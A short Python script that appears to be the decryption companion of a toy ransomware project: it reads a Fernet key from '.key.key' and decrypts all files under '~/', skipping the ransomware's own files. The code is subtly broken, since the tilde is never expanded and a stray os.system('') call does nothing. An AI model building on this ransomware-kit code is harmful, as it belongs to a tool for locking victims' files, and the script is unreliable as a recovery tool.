#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

encfiles = []

encrypt_directory = os.system('')

for dirpath, dirname, files in os.walk('~/'):
    
    for file in files:
        file = os.path.join(dirpath, file)

        if file == os.path.join(dirpath ,'ransome.py') or file == os.path.join(dirpath, '.key.key') or file == os.path.join(dirpath, 'decrypt.py'):
            pass
        else:
            encfiles.append(file)
        


key = ''

with open('.key.key', "rb") as keyf:
    key = keyf.read()

for file in encfiles:
    with open(file, "rb") as f:
        contents = f.read()
    
    decrypted = Fernet(key).decrypt(contents)

    with open(file,"wb") as f:
        f.write(decrypted)
